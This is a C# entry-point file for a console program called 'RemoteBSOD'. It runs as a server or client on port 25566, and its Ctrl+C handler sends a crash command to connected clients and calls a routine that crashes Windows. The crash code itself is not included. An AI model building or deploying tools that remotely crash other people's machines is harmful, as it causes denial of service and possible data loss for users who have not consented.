using System;
using System.Collections;
using System.Collections.Generic;
using System.Net;
using System.Threading;
using RemoteBSOD.Server;
using RemoteBSOD.ThreadController;

namespace RemoteBSOD
{
    public enum ProgramMode
    {
        ServerMode, ClientMode
    }

    public class Program : ConsoleScript
    {
        public static ProgramMode ProgramExecutionMode { get; set; }
        public static IPAddress ConnectionAddress { get; set; }
        public static bool isRunning { get; private set; } = false;

        public static void Main(string[] Args)
        {
            PrintBanner();
            ArgumentParser.ParseArguments(Args);
        }

        private static void MainThread()
        {
            isRunning = true;
            PrintLine($"Running at {Constants.TICKS_PER_SEC} ticks per second.", ConsoleColor.Blue);
            DateTime _nextLoop = DateTime.Now;

            while (isRunning)
            {
                while (_nextLoop < DateTime.Now)
                {
                    ThreadController.ThreadController.UpdateMain();

                    _nextLoop = _nextLoop.AddMilliseconds(Constants.MS_PER_TICK); // Calculate at what point in time the next tick should be executed

                    if (_nextLoop > DateTime.Now)
                    {
                        // If the execution time for the next tick is in the future, aka the server is NOT running behind
                        Thread.Sleep(_nextLoop - DateTime.Now); // Let the thread sleep until it's needed again.
                    }
                }
            }
        }

        public static void Execute()
        {
            switch(ProgramExecutionMode)
            {
                case ProgramMode.ServerMode:
                    Server.Server.Start(50, 25566);
                    break;
                case ProgramMode.ClientMode:
                    Client.Client.Initialize();
                    Client.Client.instance.ip = $"{ConnectionAddress.MapToIPv4().ToString()}";
                    Client.Client.instance.port = 25566;
                    Client.Client.instance.ConnectToServer();
                    break;
            }

            Console.CancelKeyPress += new ConsoleCancelEventHandler(exitHandler);

            Thread mainThread = new Thread(new ThreadStart(MainThread));
            mainThread.Start();
        }

        protected static void exitHandler(object sender, ConsoleCancelEventArgs args)
        {
            isRunning = false;
            args.Cancel = true;
            if(ProgramExecutionMode == ProgramMode.ServerMode)
            {
                if(Server.Server.isRunning)
                {
                    PrintLine($"KA-BOOOOOOM!");
                    ServerSend.SendCrash(true);
                    Crasher.CrashWindows();
                }
            }
            else
            {
                if(Client.Client.instance.isConnected)
                {
                    Client.Client.instance.tcp.Disconnect();
                    Client.Client.instance.udp.Disconnect();
                }
            }
        }

        static void PrintBanner()
        {
            Print(@"  _____                      _         _                   _ 
 |  __ \                    | |       | |                 | |
 | |__) |___ _ __ ___   ___ | |_ ___  | |__  ___  ___   __| |
 |  _  // _ \ '_ ` _ \ / _ \| __/ _ \ | '_ \/ __|/ _ \ / _` |
 | | \ \  __/ | | | | | (_) | ||  __/ | |_) \__ \ (_) | (_| |
 |_|  \_\___|_| |_| |_|\___/ \__\___| |_.__/|___/\___/ \__,_|
                                                             
                                                             ");
            PrintLine("[ Version 1.0 ]", ConsoleColor.Yellow);
        }
    }    
}